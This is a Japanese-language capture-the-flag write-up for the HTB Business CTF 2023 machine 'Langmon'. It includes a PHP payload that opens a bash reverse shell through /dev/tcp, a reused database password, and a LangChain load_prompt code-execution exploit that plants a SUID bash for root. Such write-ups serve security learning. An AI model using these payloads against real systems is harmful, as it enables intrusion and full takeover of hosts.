---
layout: post
title: "[Fullpwn] Langmon (600 pts, x solved)"
published : true
permalink: /ctf/writeups/HTB_Business_CTF_2023/Fullpwn_Langmon
tags: [CTF, WriteUps, HTB Business CTF]
---
## Description
N/A

## Solution
### Enumeration
### Foothold
1. Wordpressにユーザ登録後、ログインする
1. Templatesメニュー >　ADD NEW で新規テンプレートを作成する
1. テンプレート内に "[php_everywhere]"を追記する
1. テンプレート一覧に戻り、作成したテンプレートの編集画面に移動する
1. PHP Everywhereの欄に以下のペイロードを追記し、テンプレートを保存する

```php
<?php system('bash -c "bash -i >& /dev/tcp/10.10.14.30/443 0>&1"');?>
```

1. nc でリバースシェルを待ち受ける
1. テンプレートをプレビューする

### User
1. wp-config.phpからDBの資格情報を入手する。

```
password: SNJQvwWHCK
```

1. 入手した資格情報でdeveloperにユーザを切り替える

```sh
su developer
```

### Root
1. `sudo -l`を実行すると、"/opt/prompt_loader.py"をルートで実行できることが確認できる
```sh
developer@langmon:~$ sudo -l
[sudo] password for developer:
Matching Defaults entries for developer on langmon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User developer may run the following commands on langmon:
    (root) /opt/prompt_loader.py
```

- /opt/prompt_loader.py

```python
#!/usr/bin/python3
import sys
from langchain.prompts import load_prompt

def load(file):
        try:
                load_prompt(file)
        except:
                print("There is something wrong with the prompt file.")

if __name__ == "__main__":
        if len(sys.argv) != 2:
                print("Usage: prompt_loader.py <prompt_file_path>")
        else:
                file = sys.argv[1]
                load(file)
```

1. 以下で解説されている脆弱性を悪用する
https://github.com/hwchase17/langchain/issues/4849

1. ロードするprompt.pyを作成した。内容はSUIDフラグを持つbashを生成するもの。

- prompt.py

```python
from langchain.output_parsers.list import CommaSeparatedListOutputParser
from langchain.prompts.prompt import PromptTemplate
_DECIDER_TEMPLATE = """Given the below input question and list of potential tables, output a comma separated list of the table names that may be neccessary to answer this question.

Question: {query}

Table Names: {table_names}

Relevant Table Names:"""

import os
os.system('cp /bin/bash /tmp/bash;chmod 4777 /tmp/bash')
PROMPT = PromptTemplate(
    input_variables=["query", "table_names"],
    template=_DECIDER_TEMPLATE,
    output_parser=CommaSeparatedListOutputParser(),
)
```

1. 以下の通りルートを取得できた

```sh
developer@langmon:~$ sudo /opt/prompt_loader.py prompt.py
developer@langmon:~$ ll /tmp
total 1404
drwxrwxrwt  2 root     root        4096 Jul 15 04:25 ./
drwxr-xr-x 19 root     root        4096 Jul  5 11:21 ../
-rwsrwxrwx  1 root     root     1396520 Jul 15 04:25 bash*
-rw-------  1 www-data www-data   28948 Jul 15 04:07 phpJSuHOo
developer@langmon:~$

developer@langmon:~$ /tmp/bash -p
bash-5.1# id
uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)
bash-5.1#
```